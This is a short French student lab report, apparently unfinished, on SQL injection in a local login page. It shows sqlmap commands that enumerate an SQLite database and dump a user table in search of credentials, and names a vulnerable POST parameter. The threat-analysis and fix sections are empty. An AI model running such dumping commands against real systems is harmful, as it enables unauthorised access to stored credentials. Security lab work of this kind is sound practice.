# Projet 2

## Identification des failles 

En effectuant un premier test avec sqlmap on peut constater plusieurs choses. Nous avons la liste des tables, le type de la base (SQLite) et le nom de la base de données. On peut modifier les requêtes en conséquences. 

Apparemment la version SLQlite serait vulnérable aux injection UNION et à 

 **POST parameter 'txt_uname' is vulnerable** 

```sh
sqlmap -u "http://localhost:8080/login.php" --batch --tables --forms --crawl=2 --level=5 --risk=3

Database: SQLite_masterdb
[3 tables]
+-----------------+
| message         |
| sqlite_sequence |
| userSti         |
+-----------------+
```

Nous allons maintenant essayé de faire un dump de la table `userSti` afin de savoir si elle contient des credentials. On voit qu'il  y a 4 entrées utilisateur dans la table  userSti.

```sh
sqlmap -u "http://localhost:8080/login.php" --batch --dbms=SQLite -D SQLite_masterdb -T userSti --dump --forms --crawl=2 --level=5 --risk=3
+----+
| id |
+----+
| 1  |
| 2  |
| 3  |
| 5  |
+----+
```



## Analyse de menace 

## Correctif logiciel 

